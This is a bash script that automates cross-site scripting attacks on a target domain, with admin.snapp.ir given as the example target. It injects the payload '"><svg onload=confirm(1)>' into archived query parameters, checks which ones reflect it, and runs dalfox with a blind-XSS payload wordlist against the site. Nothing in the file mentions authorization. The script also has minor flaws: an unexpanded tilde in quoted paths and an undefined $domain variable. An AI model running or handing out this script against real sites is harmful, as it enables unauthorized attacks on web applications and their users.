if [[ $# -eq 0 ]];
then
    echo "Enter domain target "
    echo "ex: bash ~/script/hunt https://admin.snapp.ir snapp.ir"
    exit 1
fi
url=$1
target=$2
domainPath=`echo "$url" | unfurl domains | sed 's/\./_/g' `

if [ ! -d "~/recon/$target/$domainPath" ];then
        mkdir ~/recon/$target/$domainPath
fi
if [ ! -d "~/recon/$target/$domainPath/Vulnerability" ];then
        mkdir ~/recon/$target/$domainPath/Vulnerability
fi


echo -e "\e[1;32m[+] XSS ) \e[0m"
cat ~/recon/$target/$domainPath/Vulnerability/waybackurls.txt | grep -Ev "\.(jpeg|jpg|png|ico)$" | uro | gf xss > /tmp/xss.txt
cat /tmp/xss.txt| Gxss -c 100 -p XssReflected | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew  ~/recon/$target/$domainPath/Vulnerability/XSS.txt
cd ~/tools/Xssor.go
go run main.go  /tmp/xss.txt | grep -v "Nothing" >> ~/recon/$target/$domain/Vulnerability/XSS.txt
rm -rf  /tmp/xss.txt
cd -
echo""

echo -e "\e[1;32m[+] Blind XSS ) \e[0m"
cat ~/recon/$target/$domainPath/Vulnerability/waybackurls.txt | gf xss | sed 's/=.*/=/' | sort -u | tee /tmp/Possible_xss.txt  && cat /tmp/Possible_xss.txt | dalfox -b  ~/wordlist/blindxss pipe >> ~/recon/$target/$domainPath/Vulnerability/BlinXSS.txt
echo""
